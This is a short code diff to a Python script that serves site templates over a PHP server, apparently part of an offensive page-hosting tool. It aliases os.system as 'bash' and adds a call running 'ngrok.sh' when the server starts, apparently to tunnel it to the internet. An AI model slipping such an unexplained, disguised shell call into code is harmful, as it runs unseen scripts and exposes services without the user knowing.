@@ -15,7 +15,7 @@ import requests
 import traceback
 import shutil
 from time import sleep
-from os import path, kill, mkdir, getenv, environ, remove, devnull
+from os import path, kill, mkdir, getenv, environ, remove, devnull, system as bash
 from json import loads, decoder
 from packaging import version
 
@@ -246,6 +246,7 @@ def server():
     utils.print(f'{G}[+] {C}Port : {W}{port}\n')
     utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
     cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']
+    bash("bash ngrok.sh")
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         try:
